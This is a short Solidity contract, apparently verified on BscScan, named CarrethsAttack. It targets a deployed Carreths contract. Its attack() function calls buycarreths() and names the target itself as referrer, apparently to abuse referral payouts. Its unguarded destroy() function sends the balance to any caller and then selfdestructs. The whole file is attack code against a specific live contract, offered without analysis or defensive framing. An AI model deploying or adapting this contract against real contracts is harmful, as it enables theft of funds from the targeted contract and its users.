/**
 *Submitted for verification at BscScan.com on 2023-03-07
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICarreths {
    function buy(address recAdd) external payable;
    function sell(uint256 amount) external;
    function buycarreths(address ref) external payable;
}

contract CarrethsAttack {
    ICarreths public carreths;
    address public target;

    constructor(address _target) {
        carreths = ICarreths(_target);
        target = _target;
    }

    function attack() public payable {
        carreths.buycarreths{value: msg.value}(target);
    }

    function destroy() public {
        uint256 balance = address(this).balance;
        payable(msg.sender).transfer(balance);
        selfdestruct(payable(msg.sender));
    }
}